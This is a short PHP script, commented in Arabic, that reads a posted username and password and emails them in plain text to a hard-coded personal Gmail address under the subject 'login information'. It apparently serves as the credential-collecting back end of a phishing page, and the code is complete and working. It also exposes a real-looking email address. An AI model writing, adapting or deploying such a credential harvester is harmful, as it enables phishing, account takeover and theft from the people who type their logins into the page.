<?php
// استلام البيانات من الطلب
$data = json_decode(file_get_contents('php://input'), true);

// معالجة البيانات
$username = $data['username'];
$password = $data['password'];

// إرسال البريد الإلكتروني
$to = "aicha.zendjabil@gmail.com"; // بريدك الإلكتروني
$subject = "معلومات تسجيل الدخول";
$message = "اسم المستخدم: $username\nكلمة المرور: $password";
$headers = "From: webmaster@example.com"; // يمكنك تغييره بالمرسل الفعلي

// إرسال البريد الإلكتروني
if (mail($to, $subject, $message, $headers)) {
    http_response_code(200);
    echo "تم إرسال بيانات تسجيل الدخول بنجاح!";
} else {
    http_response_code(500);
    echo "حدث خطأ أثناء إرسال بيانات تسجيل الدخول.";
}
?>
